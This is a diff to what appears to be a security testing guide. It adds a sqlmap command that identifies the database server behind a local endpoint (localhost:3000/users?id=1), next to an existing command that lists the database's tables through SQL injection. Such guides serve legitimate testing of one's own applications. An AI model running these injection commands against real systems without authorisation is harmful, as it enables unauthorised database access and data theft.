@@ -28,6 +28,9 @@ Use the following payloads for testing:
 ```
 
 ```
+## To identify the SQL server type
+sqlmap -u "http://localhost:3000/users?id=1" -b
+
 ## To list the tables in the database.
 sqlmap -u "http://localhost:3000/users?id=1" --dbms=sqlite --tables
 
